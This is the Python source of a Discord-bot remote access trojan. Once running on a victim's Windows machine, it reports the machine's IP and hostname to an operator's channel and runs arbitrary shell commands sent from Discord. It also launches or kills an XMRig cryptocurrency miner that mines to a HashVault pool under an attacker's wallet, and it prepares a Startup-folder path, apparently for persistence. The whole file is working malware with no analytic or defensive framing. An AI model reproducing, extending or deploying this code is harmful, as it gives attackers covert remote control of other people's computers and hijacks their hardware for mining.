from discord.ext import commands
import requests, discord, psutil, socket, sys, os

token = 'MToken.mnt.discord' # Token
channel_id = 111111111111111111  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get('https://sheesh.rip/ip').headers['IP']
hostname = socket.gethostname()
appdata = os.getenv("AppData")
startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
temp = os.getenv('temp')
os.chdir(temp)

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f'{bot.user}')
    await channel.send(f"``[+] {ip}@{hostname}: Session opened``")

# ----- Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {ip}@{hostname}``")
    
# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")

# check
@bot.command()
async def check(ctx):
    if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")

# miner
@bot.command()
async def miner(ctx, walletArg):
    wallet = ''.join(walletArg)
    os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
    await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
        os.popen("taskkill /F /IM xmrig.exe /T")
        await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")

bot.run(token)